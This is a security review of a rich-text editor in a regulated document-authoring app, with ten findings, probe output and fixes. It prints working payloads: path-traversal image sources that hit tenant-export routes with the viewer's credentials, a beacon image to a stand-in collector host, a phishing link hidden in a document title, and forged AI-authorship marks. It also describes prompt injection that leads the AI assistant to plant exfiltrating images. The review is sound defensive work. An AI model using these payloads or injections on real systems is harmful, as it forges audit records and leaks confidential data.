# Security lens: the editor family, RichSectionEditor, 2026-09-28

## Scope actually covered

**Commit.** The review is at `7087f46e2`. I read `client/src/concept2cure/v2/editor/RichSectionEditor.tsx` in full, lines 1–2716.

HEAD moved to `185bbbb0` during this pass. That came from other sessions: two commits, uncommitted edits to `server/routes/protocol-*.ts`, and a new `docs/evidence/reviews/2026-09-28/editor-family/`. None of it is mine. I checked every file cited below against `7087f46e2` with `git diff --quiet 7087f46e2 -- <file>`. The only cited file with uncommitted edits was `protocol-development.ts`, so I re-read its lines 358–366 from the commit.

**Imported and host code, read only as far as the traced paths:**
- `editor/imageNode.ts` 1–207 (full)
- `editor/roundTrip.ts` 1–443 (full)
- `editor/AuthoredHtml.tsx` 1–102 (full)
- `editor/suggestions.ts` 29–135, 395–480, 616–645, 825–870
- `editor/ProjectFilesPanel.tsx` 80–116, 345
- `editor/DocumentWorkbench.tsx` 255–275, 995–1110, 1976–2110, 2130–2235, 2270–2345, 2680–2760, 3760–3930, 4080–4105, 4668
- `PathwayPanes.tsx` 960–985
- `ProtocolDevSection.tsx` 96–185
- `EctdCoauthor.tsx` 357–378, 935–965
- `components/ana/renderSafeMarkdown.ts` 20–199
- `components/ana/useAnaChat.ts` 900–960
- `lib/queryClient.ts` 362–455
- `lineage/dataOriginsApi.ts` 1–190
- `utils/authToken.ts` (storage functions)
- `services/portal/authService.tsx` 206–219, 664–683, 767–768, 986–996
- `flags/featureFlags.ts` 74–81, 313–338
- Installed libraries:
  - `@tiptap/core` 3.31.3: `elementFromString` 555–560, `createNodeFromContent` 586–634, `insertContentAt` 663–757, `mergeAttributes` 1397–1426
  - `@tiptap/extension-link` 3.31.3: 88–120, 268–400

**Server files traced:**
- `server/routes/authoring.router.ts`:
  - 299–360 (`canEditSection`)
  - 413–475
  - 1647–1960 (section PATCH)
  - 2515–2545 (cite-source)
  - 5880–6100 (tracked-change decisions)
  - 6256–6410 (images)
  - 6429–6481 (Word import)
- Authoring services:
  - `services/authoring/revision-ledger.ts` 153–240
  - `routes/governed-reason.ts` 1–44
  - `services/authoring/authoring-html-sanitizer.ts` 1–63
  - `services/authoring/authoring-from-draft.ts` 100–150, 236–260
- Export and import:
  - `export/authoring-images.ts`
  - `export/authoring-blocks-to-html.ts` (image and href emission)
  - `import/docx-to-authoring.ts` 1–80, 158–200
- Collaboration:
  - `services/hocuspocus-server.ts` 1–70, 120–396
  - `services/collab/collab-authorization.ts` 94–137
  - `services/collab/collab-state.store.ts` 60–125
- Data Origins and citations:
  - `routes/data-origins.routes.ts` 86–270
  - `span-lineage.service.ts` 1141–1164
  - `source-usage.service.ts` 172–230
- Other stores the hosts save to:
  - `routes/coauthor.ts` 20–34, 285–330
  - `coauthor-status-write.ts` 240–304
  - `routes/protocol-development.ts` 358–366
- Side-effecting GET routes: `routes/tenant-export.ts` 54–70, 157–232; `routes/global-compliance.ts` 73–81, 420–520
- AnA: `routes/ana-ri/stream.ts` 466–500; `ana/tool-authorization.register.json` (parsed); `AnaToolExecutor.ts` 13745–13775
- Middleware and config: `middleware/enterprise-security.ts` 205–262, 548–590; `middleware/tenantContext.ts` 90–130; `terraform/modules/cloudfront/main.tf` 130–146

**Gates run read-only.** All pass, and none covers any finding below.
- `ci:unauthenticated-fetch`: 70 raw fetches, 0 baselined.
- `ci:upload-guards`: 4 unguarded multer sites, none new.
- `check:security-patterns`: 0 violations across 2,863 files.

**Probes.** All ran from the scratchpad, never inside the repository:
- the real `imageNode.ts` resolver with a stubbed `fetch`;
- `insertReference`'s exact call on a headless TipTap editor under jsdom;
- `RichSectionEditor` itself under vitest + jsdom, for the comment-anchor save and for a forged AnA mark;
- the server sanitiser's exact DOMPurify config over the same inputs.

`git status` stayed clean after each probe. Vite's temporary config bundle passed through the gitignored `node_modules/.vite-temp`, which was left empty.

**Lens items checked, with no finding in this file:**
- **Sinks.** There is no `dangerouslySetInnerHTML`, `innerHTML`, `postMessage` listener, `window.open`, location write or raw `fetch` in `RichSectionEditor.tsx`. `localStorage` is used only for the crash cache (1086–1163, 2566–2567).
- **Parsing.** Every HTML parse on the editor's paths is inert, so `htmlVisibleText(sourceText)` on each source-mode render is safe:
  - `DOMParser` at `roundTrip.ts:79,356`, `RichSectionEditor.tsx:908` and `citationNode.ts:104`;
  - TipTap's own `elementFromString` (core `index.js:557-558`).
- **Links.** TipTap's Link refuses `javascript:` and `data:` hrefs on both parse and render (link `index.js:362-395`).
- **AI drafts.** AnA drafts enter as text nodes, never as parsed HTML (`insertSuggestedContent` builds `schema.text(...)`, suggestions.ts:833–866).
- **Rendering.** Every client sink for stored section HTML goes through DOMPurify (`renderSafeMarkdown` / `AuthoredHtml`). The server export escapes text and emits only internal anchors and `data:` images (authoring-blocks-to-html.ts:43, 104–152, 218–227).
- **Tenant keys.** On every path this file starts, the tenant comes from the session (see IAM-15 below).

## Findings

| id | severity | file:line | summary |
|---|---|---|---|
| SEC-B-1 | high | `client/src/concept2cure/v2/editor/imageNode.ts:51-53, 68-72` (in the schema at `RichSectionEditor.tsx:759`) | An image reference with `..` segments passes the governed-image prefix check. Every viewer's browser then sends an authenticated GET to any `/api/*` route, including routes that write audit rows in the viewer's name. |
| SEC-B-2 | high | `imageNode.ts:59-67, 173-177`; `RichSectionEditor.tsx:885-888` | External image references in governed sections are fetched from third-party hosts by every viewer. This gives a read receipt on confidential documents, a figure that can change after approval, and a data channel for injected AI output. |
| SEC-B-3 | blocker | `RichSectionEditor.tsx:1279-1299` | Prose typed while a comment is being written is saved under the system reason "Comment anchor applied", bypassing the author's reason for change. The anchor also lands on other words. |
| SEC-B-4 | medium | `RichSectionEditor.tsx:1432-1438` | "Insert reference" parses a vault document title as HTML, so markup in a title becomes links and images in the section. |
| SEC-B-5 | medium (dark today; blocker once enabled) | `RichSectionEditor.tsx:1039-1047`; `server/services/collab/collab-authorization.ts:99-116` | The co-editing room admits any tenant member, whatever their edit grant and whether or not the record is sealed. The editor then shows the room's contents as the saved section. |
| SEC-B-6 | medium | `RichSectionEditor.tsx:325, 1082-1104` | Unsaved section content stays in `localStorage` after sign-out. It is keyed by section, not user, and is offered to the next person on the device. |
| SEC-B-7 | medium | `RichSectionEditor.tsx:1389-1407`; `server/routes/authoring.router.ts:5910-5912` | AI authorship is a client assertion (`data-author-id="ana"`), which the server records as verified. |
| SEC-B-8 | low | `RichSectionEditor.tsx:1309-1315` | Selected document text is interpolated into the user's own instruction to AnA. The server's injection guard only observes by default. |
| SEC-B-9 | low | `RichSectionEditor.tsx:736` | Links from stored or pasted content keep their own `rel`/`target` and non-web schemes, and navigate natively in a read-only canvas. |
| SEC-B-10 | low | `DocumentWorkbench.tsx:2137-2157`; `lineage/dataOriginsApi.ts:71,92,167` | The image upload and Data Origins calls behind the editor bypass `apiRequest` / `apiUpload`. |

### SEC-B-1 — high — an image reference with `..` segments gets an authenticated GET to any API route from every viewer

**What the code does.** The editor's schema includes `AuthoringImage` (759). That node accepts any `img[src]` without checking the value (imageNode.ts:116 `src: { default: null }`, 136–138 `return [{ tag: 'img[src]' }];`). Its node view resolves every src through this check:

```ts
// imageNode.ts:51-53
export function isApiImageSrc(src: string): boolean {
  return src.startsWith(AUTHORING_IMAGE_URL_PREFIX);   // '/api/authoring/images/'
}
// imageNode.ts:68-71
  let hit = objectUrlCache.get(src);
  if (!hit) {
    hit = (async () => {
      const res = await apiRequest('GET', src);
```

`apiRequest` passes the string to `fetch` unchanged, together with `'x-organization-id': organizationId,` and `Authorization: \`Bearer ${authToken}\`` (queryClient.ts:373–374), plus `credentials: 'include',` (381) and `const response = await fetch(url, options);` (388). The browser's URL parser removes dot-segments before the request is sent. The read-only renderers have the same flaw: `if (src.startsWith(AUTHORING_IMAGE_URL_PREFIX)) {` (renderSafeMarkdown.ts:183), which feeds `resolveImageSrc` in AuthoredHtml.tsx:67–71.

**Why it matters.** The code's own comment says this is the threat the check closes: "This was a bare '/api/' test, which let any API path one author stored in section HTML be fetched with the NEXT VIEWER's auth when the document rendered" (imageNode.ts:47–50). It does not close it. Content can reach a section through several routes:
- a paste from a third-party page or document (885–888 keeps the clipboard HTML);
- a vault title (SEC-B-4);
- an AnA `draft_authoring_document` draft;
- a direct PATCH by any editor of the section.

Each route makes every later viewer's browser send an authenticated GET chosen by whoever wrote the content. Some GET routes write governed records:
- **Full tenant export.** For an owner or admin, `router.get('/full'` (tenant-export.ts:157) passes `if (!isAdmin(req))` (162). It then runs `const receipt = await recordExportReceipt(pool, {` (170), writing a receipt that later offboarding purges look up. It also writes a §11.10(e) row with `action: 'tenant.export.full',` (197–200), attributed to that admin.
- **GDPR data-subject export.** `GET /api/compliance/gdpr/:orgId/data-subject/:id/export` runs `INSERT INTO gdpr_data_subject_requests` (global-compliance.ts:427, 517).

The audit trail then records acts the person never performed. The response stays in the viewer's browser, so this is request forgery, not a data read.

**Server enforcement: none.**
- The section PATCH stores content as sent: `updates.push(\`content = $${paramCount}\`); values.push(content);` (authoring.router.ts:1801–1802).
- The server sanitiser used on the AI path says "Same-app `/api/` image references are left as the editor stores them" (authoring-html-sanitizer.ts:29–30). Running its exact config returned `<img src="/api/authoring/images/../../tenant-export/full">` and the `%2e%2e` form unchanged.
- The export is not affected. It takes only the id after the prefix and fetches nothing else (authoring-images.ts:152–153).

**Evidence (executed).** I ran the real `imageNode.ts` with a stubbed `fetch` that resolves URLs the way a browser does:

```
{"src":"/api/authoring/images/../../tenant-export/full","isApiImageSrc":true,"outcome":"fetched"}
{"src":"/api/authoring/images/%2e%2e/%2e%2e/users/me","isApiImageSrc":true,"outcome":"fetched"}
{"src":"/api/c2c/projects","isApiImageSrc":false,"outcome":"refused: NOT_A_FIGURE_REF"}
requested "/api/authoring/images/../../tenant-export/full" -> path "/api/tenant-export/full", auth "Bearer VIEWER-BEARER", org "7"
```

The only test of the check covers a valid reference, an `https:` URL and a `data:` URI (`client/src/concept2cure/v2/__tests__/imageEditing.test.ts:60-62`). It has never been seen to fail on the case it exists for.

**Smallest fix.** Share one validator between `isApiImageSrc` and the `sanitizeAuthoringHtml` hook:
- parse with `new URL(src, location.origin)` and require the same origin;
- require the raw src to be exactly `/api/authoring/images/<id>`, with no further segment and no `.`, `%2e`, `\`, `?` or `#`;
- fetch the canonical path;
- add the traversal cases to `imageEditing.test.ts`, failing first.

On the server, apply the same rule on section writes and in `sanitizeAuthoringSectionHtml`. Refuse or drop any `<img src>` that is not a canonical reference or `data:image/(png|jpeg|gif)`.

### SEC-B-2 — high — external image references are fetched from third parties by every viewer

**What the code does.** Any src outside `/api/` goes to the browser as-is:
- `return Promise.resolve(src);` (imageNode.ts:66), then `img.src = url;` (175);
- the header states the intent: "External http(s) images pasted from elsewhere are displayed directly by the browser" (imageNode.ts:33).

Paste keeps the clipboard HTML: `transformPastedHTML: (html) => { pastedHtmlRef.current = html; return html; }` (RichSectionEditor.tsx:885–888).

**Why it matters.**
1. **Confidentiality.** Each time anyone opens the section, in the editor or a read-only view, their browser contacts a host that the content's author chose. The host learns the time, IP, user agent and, under the CloudFront referrer policy, the app's origin. A pasted web page or email carries such a beacon without anyone intending it.
2. **What is shown can change.** The record stores only the URL, so the host can change the figure after the section is approved or frozen. The export refuses these references, printing `[Figure not exported: …` (authoring-images.ts:18–20, 152; authoring-blocks-to-html.ts:218). So the canvas shows a figure the filed document does not contain.
3. **AI path.** `draft_authoring_document` stores model-written HTML through `sanitizeAuthoringSectionHtml(s.content)` (authoring-from-draft.ts:252). That sanitiser keeps `<img src="https://collector.example/p.png?d=…">` (DOMPurify run). An instruction injected into AnA plus one confirm click can therefore plant a URL that sends data out whenever the document is opened. The chat renderer bans images for exactly this reason: "Chat stays image-free on purpose (model/tool-authored chat HTML rendering arbitrary external images is a tracking/exfil surface); authored sections carry their figures" (renderSafeMarkdown.ts:67–69).

**Server enforcement: none on write** (authoring.router.ts:1801–1802; coauthor-status-write.ts:241–303). The production CSP allows the fetch: `imgSrc: ["'self'", 'data:', 'https:', 'blob:'],` (enterprise-security.ts:240). The CloudFront policy that serves the app has no `img-src` at all (`terraform/modules/cloudfront/main.tf:143`).

**Smallest fix.**
- In `resolveImageSrc`, display only canonical figure references and `data:image/(png|jpeg|gif)`. Show anything else in the existing "cannot be displayed" state, with a prompt to upload it.
- Name dropped external images in the paste notice.
- Apply the SEC-B-1 server allowlist to every section write.

### SEC-B-3 — blocker — a comment anchor saves unrelated prose under a system reason, and anchors the wrong words

**What the code does.**

```ts
1273      const { from, to } = editor.state.selection;
1279      if (dirty) {                                   // checked once, before the wait
1286        id = await commentsApi.onCreate({ kind: 'text-range', quote, from, to });
1295      editor.chain().focus().setTextSelection({ from, to }).setCommentAnchor(id).run();
1299      const saved = await doSave('Comment anchor applied');
```

In the Authoring workbench, the only host that passes `commentsApi` (DocumentWorkbench.tsx:3859), the await resolves only once the author has typed the comment in the rail and posted it (`pending.resolve(typeof created?.id === 'string' ? created.id : null);`, 2315). The canvas stays editable meanwhile (`readOnly={docSealed}`, 3834). The host skips the author's reason whenever a system reason is set: `if (!systemReason && changeReasonRef.current.trim().length < 8) {` (1987) and `const reasonForChange = systemReason ?? changeReasonRef.current.trim();` (2021).

**Why it matters.** The editor's own comment names this outcome as the one to prevent: "two paragraphs the author never reasoned for would be minted as a revision 'Comment anchor applied' — bypassing the §11.10(d) reason the save gate exists to require" (1275–1278). The guard runs before the wait, not after it. Any edit made while writing the comment goes into the hash-chained revision ledger and the Part 11 audit row under a reason the author never gave. A corrected dose is an example. The anchor positions are not mapped through those edits, so reviewers see the comment on words other than the ones quoted to the server.

**Server enforcement: none possible as built.** The server only requires 8 or more characters (`.min(GOVERNED_REASON_MIN, …)`, governed-reason.ts:21–25; authoring.router.ts:1810). The same file warns that "a placeholder in a hash-chained ledger reads as a real reason and is worse than an empty one" (governed-reason.ts:7–8).

**Evidence (executed).** I ran the real component under vitest + jsdom:
1. Selected "endpoint" and clicked Comment. The buffer was clean, so the guard passed.
2. Typed "Dose changed to 100 mg. " before the host resolved.
3. Saw `onSave` receive the reason `"Comment anchor applied"` and this content:

```
<p>Dose<span data-comment-id="c-1" class="rse-comment-anchor"> changed</span> to 100 mg. The endpoint was met.</p>
```

The quote sent to the server was "endpoint". The anchor landed on " changed".

**Smallest fix.**
- After the await, compare the buffer (anchor mark aside) with `lastSavedRef.current`. If anything else changed, do not save under the system reason; tell the author to save their edits with their own reason first.
- Map `from`/`to` through the intervening transactions, and refuse to anchor if the quote is no longer at the mapped range.
- A durable server-side guard would be an anchor-only endpoint that accepts a save only when the text before and after is identical apart from the anchor span.

### SEC-B-4 — medium — "Insert reference" turns markup in a vault title into section content

**What the code does.** The handle is documented as "Insert plain reference text … Deliberately text, not a citation node" (RichSectionEditor.tsx:168–174), but it calls:

```ts
1437          return editor.chain().focus().insertContent(clean).run();
```

TipTap parses a string as HTML (core `index.js:557-558, 622-625`). It inserts the parsed nodes unless every node is unmarked text (711–745). The text comes from `referenceTextFor`, which builds `` [`“${doc.title}”`] `` (ProjectFilesPanel.tsx:96–102; called at 345, wired at DocumentWorkbench.tsx:4668). Vault titles are checked for length only (vault-metadata-edit.service.ts:69–74).

**Why it matters.** Anyone who can name a vault document chooses what enters another author's section when that author clicks Insert reference. That could be a link to a phishing page, or an image carrying a SEC-B-1 src, whose authenticated GET fires at insertion.

**Evidence (executed).** I ran the real `imageNode` and `referenceTextFor` on headless TipTap under jsdom, with this title:

```
Stability <a href="https://phish.example/login">see protocol</a> <img src="/api/authoring/images/../../tenant-export/full">
```

It was inserted as a real link and a block `<img src="/api/authoring/images/../../tenant-export/full">`. The stubbed `fetch` logged `FETCH fired for /api/authoring/images/../../tenant-export/full`. A title with only unknown tags, `Assay <LOQ> results`, stayed text.

**Smallest fix.** Insert a text node instead, with `insertContent({ type: 'text', text: clean })` or `tr.insertText(clean)`.

### SEC-B-5 — medium (dark by default; blocker once live co-editing is on) — the co-editing room bypasses edit grants and sealed state, and the canvas calls it saved

**What the code does.** On first sync the editor adopts whatever the room holds as the clean baseline. It seeds from the stored record only when the room is empty (1040–1042):

```ts
1043        // Whether seeded here or adopted from peers, what the synced doc
1044        // holds now is the clean baseline for dirty-tracking.
1045        lastSavedRef.current = serializeEditor(editor, format);
1047        setSaveState('saved');
```

The workbench connects even on sealed documents (DocumentWorkbench.tsx:3920–3923; `collab` does not depend on `docSealed`).

The server authorizes a room by tenant ownership only: `SELECT 1 FROM authoring_documents WHERE id = $1::uuid AND tenant_id = $2` (collab-authorization.ts:99–105, and the section check at 108–116). Two of `canEditSection`'s checks are missing there:
- the refusal for FROZEN/APPROVED documents (authoring.router.ts:317–336);
- the per-user grant matrix (338–359).

`readOnly` is set only by tenant posture (hocuspocus-server.ts:170). Membership is checked once, at connect (256), with no re-check timer; this is the IAM-19 shape. Room state persists across sessions (hocuspocus-server.ts:341–392).

**Why it matters (when enabled).** A member with no edit grant, or anyone on a frozen or approved document, can write into the room. Every later opener sees that text as the section, marked "All changes saved". The next editor to save writes it into the governed record under their own name and reason. No malice is needed either: after a revert remounts the editor, a room that still holds pre-revert or abandoned unsaved text overrides the record on screen, and the next save writes it back.

**Why it is not live.**
- `ENABLE_LIVE_COEDITING` is compiled as `enabled: false`, with no runtime setter (featureFlags.ts:74–81, 313–338).
- `ENABLE_COLLAB_CRDT` is unset (`.env.example:227`, absent from `terraform/`).

**Smallest fix.**
- In `authorizeResource`, run the same decision as `canEditSection` (sealed or no grant means read-only or refuse), and re-check membership on a timer.
- In the client, do not connect for read-only sections. After first sync, compare the room with the stored record and say so if they differ, instead of setting `'saved'`.

### SEC-B-6 — medium — unsaved regulated text outlives sign-out and is offered to the next user

**What the code does.** Each dirty buffer is written to `const cacheKeyFor = (storageKey: string) => 'dc::' + storageKey;` (325, 1082–1093, 2564–2571). On mount, a cached value that differs from the section is offered back: `if (cached != null && cached !== (value ?? '')) setRestoreOffer(cached);` (1099). The notice reads "A draft cached on this device differs from the saved section" (1875) and does not say whose draft it is.

The keys are per section, not per user:
- `storageKey={activeSection.id}` (DocumentWorkbench.tsx:3836);
- `'coauthor:' + activeDoc.id` (EctdCoauthor.tsx:953);
- `pdev-section-${sec.id}` (ProtocolDevSection.tsx:176).

Sign-out and server-ended sessions call `clearAuth()` (authService.tsx:683, 768). That in turn calls `SecureStorage.clear()`, which removes only the auth and legacy bearer keys (206–219, 986–996).

**Why it matters.** Text that never reached the record stays readable on the device after sign-out or an idle timeout. On a shared workstation the next person can read it, as can any script running on the app's origin. If a colleague in the same tenant opens that section and restores the draft, the absent author's words are saved under the colleague's name and reason.

**Server enforcement.** Not applicable; this is device state. The save that follows a restore is attributed to whoever presses Save.

**Smallest fix.** Key the cache by user (`dc::<userId>::<key>`). Remove all `dc::` keys in `clearAuth()`. Show the draft's owner and time in the restore notice.

### SEC-B-7 — medium — AI authorship is a client claim that the server records as verified

**What the code does.** Suggestion marks carry `data-author-id` and `data-author-name`, parsed straight from stored HTML (suggestions.ts:79–114). Accepting one records that author and text (suggestions.ts:627–645). The save sends them along (RichSectionEditor.tsx:1389–1407 → DocumentWorkbench.tsx:2003–2026).

The server checks only that the id is `ana` (revision-ledger.ts:188–201, 228–240). It then records three things:
- the revision origin `contributors.length ? 'ai-draft-accept' : 'human-edit'` (authoring.router.ts:1879);
- machine lineage for the accepted clauses (1898);
- the decision's proposer as `return { proposedBy: MACHINE_AUTHOR_IDS[authorId], proposedByVerified: true };` (5911).

**Why it matters.** Which clauses of a filing were machine-drafted is a governed fact in this product: it feeds lineage, Data Origins and AI transparency. A stored `<ins data-author-id="ana">` is indistinguishable from a real AnA draft, whether it was written by any editor through PATCH (stored verbatim), pasted, or kept by the AI-path sanitiser (`data-*` survived the DOMPurify run). The audit row then says the claim was verified. The audit rail is honest ("as recorded by the editing client", DocumentWorkbench.tsx:267). The stored flag, the revision origin and the lineage kind are not.

**Evidence (executed).** I rendered a stored forged mark in the real component:
- The review strip showed "insert · AnA (AI draft) · No dose adjustment is needed in renal impairment."
- After "Accept all", `takeAcceptedAuthors()` returned `[{"id":"ana","name":"AnA (AI draft)"}]`.
- `takeAcceptedInsertions()` returned `[{"authorId":"ana","text":"No dose adjustment is needed in renal impairment."}]`.

**Smallest fix.** Record a digest of each AnA output on the server when the stream produces it, per tenant and section or run. Accept an `ana` claim only when the text is contained in a recorded output. Otherwise mark it unverified, and never set `proposedByVerified: true` on vocabulary membership alone.

### SEC-B-8 — low — document text becomes part of the user's instruction to AnA

**What the code does.** `if (s) onAsk(\`Suggest a source for this claim: "${s}"\`);` (1314). The hosts send this as the user's own message to `/api/ana-ri/stream`: DocumentWorkbench.tsx:1059–1074 → useAnaChat.ts:955; EctdCoauthor.tsx:961; ProtocolDevSection.tsx:178.

**Why it matters.** Text a third party wrote (a pasted CRO passage, an imported Word file) is sent with the user's authority to an agent that has tools. The selection itself can close the `"` delimiter.

**Server enforcement: partial.**
- **What holds.** The tool gate: the register classifies 552 tools as read, 158 confirm, 21 conditional, 17 refuse, 14 self and 1 command. E-signed acts refuse, e.g. `registerToolHandler('retire_qms_document', async () => refuseSignatureInChat(` (AnaToolExecutor.ts:13771–13772).
- **What doesn't.** The injection guard only observes: "hard-block and content encapsulation are opt-in via PROMPT_INJECTION_ENFORCE / PROMPT_INJECTION_ENCAPSULATE (both default OFF), so with default config this is pure observation" (stream.ts:470–473). Neither variable is set in `terraform/`, `.github/workflows/`, `.env.example` or the server config.
- **The residual with teeth** is SEC-B-1 and SEC-B-2: one confirmed draft can store images that fire for every viewer.

**Smallest fix.** Send the selection as a separate, labelled context field, which the server wraps as untrusted data. Set `PROMPT_INJECTION_ENCAPSULATE` in the deployed configuration.

### SEC-B-9 — low — links from content keep their own `rel`, `target` and schemes

**What the code does.** The Link mark is configured only with `link: { openOnClick: false, autolink: true },` (736).
- TipTap parses `rel` and `target` from the content (link `index.js:356-357`). Those override its default `rel: "noopener noreferrer nofollow"` (331), because `mergeAttributes` ends with `else mergedAttributes[key] = value;` (core 1422).
- Its URI allowlist admits ftp, tel, sms, cid, xmpp, relative and protocol-relative hrefs (link 273–290). The editor's own link bar allows only http(s) and mailto (1532–1536).
- In a read-only canvas the click handler exits early with `if (!view.editable) return false;` (link 96), so a click is a native navigation.

**Why it matters.** A pasted `rel="opener"` link in a frozen section lets the opened page redirect the app's tab, for example to a fake sign-in page. A `target="_self"` link navigates the app away. The trigger is narrow: planted content plus a click.

**Server enforcement: none.** Both sanitisers allow `rel` and `target` (authoring-html-sanitizer.ts:49; renderSafeMarkdown.ts:58), and `rel="opener"` survived the DOMPurify run.

**Smallest fix.** Override the Link attributes so `rel` is always `noopener noreferrer nofollow` and `target` always `_blank`. Limit `isAllowedUri` to http(s) and mailto. Drop `rel` and `target` from the sanitisers' allowlists.

### SEC-B-10 — low — two request paths behind the editor bypass the authenticated client

**What the code does.**
- The editor's `imagesApi.upload` is a raw `fetch('/api/authoring/images', …)` with a hand-attached bearer token (DocumentWorkbench.tsx:2137–2157). It duplicates `apiUpload` (queryClient.ts:440; "The auth/org header logic is NOT duplicated here", 433).
- The Data Origins components the editor mounts (2595–2637) use raw `fetch` with `getAuthHeaders()` (dataOriginsApi.ts:71, 92, 167).

**Why it matters.** Both paths are authenticated; `ci:unauthenticated-fetch` passes. But when the server ends a session for idleness, the resulting 401 is not announced (`if (ended) announceSessionEnded(ended);`, queryClient.ts:395). The user gets an upload error instead of being signed out. The audit-row probe is skipped too. And the upload path is a second copy of one the zero-duplication rule forbids.

**Server enforcement.** The server does enforce auth and tenant scope on both routes (authoring.router.ts:6309; data-origins.routes.ts:90, 225; span-lineage.service.ts:1156). This is client polish.

**Smallest fix.** Use `apiUpload('POST', '/api/authoring/images', form)`, and `apiRequest` in `dataOriginsApi.ts`.

## Earlier findings re-verified

| Earlier item | State at `7087f46e2` | Evidence |
|---|---|---|
| Earlier security findings on this file | None existed | The four security reports have no finding on `RichSectionEditor.tsx`, `imageNode.ts` or the editor's paths (grep for editor, tiptap, sanitize, innerHTML, collab, localStorage, onAsk). The 09-24 and 09-28 reviews record the file as not read line by line (a11y 09-24:46; a11y 09-28:44; README 09-28:46). This pass closes that gap for this file. |
| IAM-14, authoring half (the image and DOCX uploads trusted the client MIME type) | Changed: the image upload is fixed; the DOCX import is still open | **Image:** `verifyFileSignature` and `scanBuffer` run before storing (authoring.router.ts:6318–6335). **DOCX import:** accepts on the MIME type or a `.docx` name only (6433–6435) and parses without a signature or AV check (6454–6481). It is parse-only; nothing is stored. The `ci:upload-guards` baseline reason, "image and DOCX import trust the declared MIME type", is now stale for the image site (`authoring.router.ts:6278`). |
| IAM-06 (bearer tokens in web storage) | Unchanged as it bears on this file | The token is read from sessionStorage (authToken.ts:57–76). The editor hands it to the collab provider (DocumentWorkbench.tsx:3923 → RichSectionEditor.tsx:703), which sends it in the socket's auth message, not the URL. I did not re-verify the server session controls. |
| IAM-15 (tenant keys from client state) | Holds on every path this file starts | The tenant comes from the JWT on the section PATCH (authoring.router.ts:468–475, 1662, 1670), images (6309, 6387), cite-source (2517 → source-usage.service.ts:183–201), tracked-change decisions (5936, 5939), Data Origins (data-origins.routes.ts:90, 225), collab (hocuspocus-server.ts:246–256, 286) and coauthor (coauthor.ts:23–28). The `x-organization-id` header is only compared with the JWT, never trusted (enterprise-security.ts:554–590). |
| SEC-0928-1 (`retire_qms_document` by confirm click) | Fixed at this commit | The handler refuses (AnaToolExecutor.ts:13771–13772), and the register class is `refuse`. |
| DP-08 (weak injection heuristic) | Still open | The guard only observes by default (stream.ts:468–474); see SEC-B-8. |
| Audit "verified strength": the collab socket's per-document authorization | Holds at tenant granularity only | collab-authorization.ts:94–119; see SEC-B-5. |
| Audit "verified strength": DOMPurify as the one HTML sanitiser | Holds for rendering, but its authoring allowlist admits the image vectors | renderSafeMarkdown.ts:92–105, 176–198; see SEC-B-1 and SEC-B-2. |
| IAM-19 (no periodic session re-check on `/ana`) | The same shape exists on `/collab`, which is dark | hocuspocus-server.ts:250–265 has no timer; folded into SEC-B-5. |
| The earlier fix recorded in code at imageNode.ts:47–50 (a bare `/api/` test replaced by the prefix check) | Incomplete | See SEC-B-1. The fix cannot be attributed to a commit: the clone is shallow, and `e128a656` (2026-09-22) imports 10,191 files at once. |

## What I did NOT get to

- **Imported editor modules** were not read line by line beyond the traced paths: the rest of `suggestions.ts`, and all of `commentAnchor.ts`, `findReplace.ts`, `citationNode.ts`, `crossReferenceNode.ts` and `captionNumbering.ts`. I grepped them for DOM sinks (none found) and read only the functions this file calls.
- **`DocumentWorkbench.tsx`** (5,134 lines) was read only in the ranges listed. It hosts most of these paths and needs its own pass.
- **Nothing was run in a real browser or against a running server:**
  - SEC-B-1's side effect on `/api/tenant-export/full` comes from reading tenant-export.ts:157–232. Its request path is proven with the real resolver plus the WHATWG URL algorithm in Node.
  - SEC-B-2's third-party request was not observed on the wire.
  - SEC-B-5 was not run: no Hocuspocus server, and both flags are off.
- **The inventory of side-effecting GET routes is incomplete.** A heuristic scan of `server/routes` gave 28 candidates, many of them false positives (for example `authoring.router.ts:5347` and `:5703` are read-only). I confirmed only `tenant-export.ts:157` and `global-compliance.ts:427` by reading them.
- **Prompt injection (SEC-B-8):** no model was run, and `ci:ai-tenant-binding` was not re-run. I did not read the proposal card a person confirms for `draft_authoring_document`, so I don't know whether image URLs are visible there.
- **Lead outside this lens, not verified as a finding:** the eCTD co-author save that this editor drives appears to record neither a reason nor an audit row. The path is `EctdCoauthor.tsx:357-364` → `PUT /api/coauthor/documents/:id` (`coauthor.ts:285-330`) → `coauthor-status-write.ts:241-303`, and I found no trigger on `coauthor_documents` in `migrations/` or `db/migrations/`. The Part 11 lens should confirm.
- **Batch-draft accept** (`batch-draft-routes.ts:352-377`) stores client-sent AI content into the store EctdCoauthor opens in this editor. Not traced further.
- **Not checked:**
  - the MDX drawer's plain-text store route;
  - Firefox and Safari behaviour for native link clicks in a non-editable ProseMirror view (SEC-B-9);
  - the new `docs/evidence/reviews/2026-09-28/editor-family/` directory, which another session created during this pass.
